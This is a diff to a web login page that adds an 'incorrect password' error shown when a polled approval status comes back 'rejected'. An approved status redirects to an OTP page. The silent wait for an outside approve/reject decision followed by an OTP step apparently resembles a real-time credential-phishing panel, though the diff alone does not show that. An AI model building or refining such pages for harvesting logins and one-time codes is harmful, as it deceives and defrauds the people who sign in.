@@ -255,6 +255,14 @@
   .login-field.invalid input{
     border-bottom-color:#c0392b;
   }
+  .login-error{
+    display:none;
+    color:#c0392b;
+    font-size:12px;
+    text-align:center;
+    margin:8px 0 12px;
+  }
+  .login-error.show{display:block;}
   .login-field input:focus{
     outline:none;
     border-bottom:1.5px solid var(--link);
@@ -425,6 +433,7 @@
           <input type="password" id="password" name="password">
           <span class="req">Required</span>
         </div>
+        <div class="login-error" id="loginError" role="alert">Username or password is incorrect</div>
         <button class="login-submit" type="button" id="loginBtn">Login</button>
         <button class="login-submit login-submit--ghost" type="button">Quick Preview</button>
         <div class="login-links">
@@ -585,6 +594,7 @@
     var username = document.getElementById('username');
     var password = document.getElementById('password');
     var overlay = document.getElementById('loadingOverlay');
+    var loginError = document.getElementById('loginError');
 
     var loadingText = document.getElementById('loadingText');
     var loadingSpinner = document.getElementById('loadingSpinner');
@@ -608,9 +618,10 @@
               window.location.href = 'otp-en.html';
             } else if (data.status === 'rejected') {
               stopStatusPoll();
-              loadingSpinner.style.display = 'none';
-              loadingText.textContent = 'Your request was declined. Please try again.';
-              retryBtn.style.display = 'block';
+              overlay.classList.remove('show');
+              loginError.classList.add('show');
+              loginSubmitting = false;
+              loginBtn.disabled = false;
             }
             // still pending, keep waiting silently
           })
@@ -648,6 +659,7 @@
       if (valid) {
         loginSubmitting = true;
         loginBtn.disabled = true;
+        loginError.classList.remove('show');
         overlay.classList.add('show');
         loadingSpinner.style.display = 'block';
         loadingText.textContent = 'Logging in...';
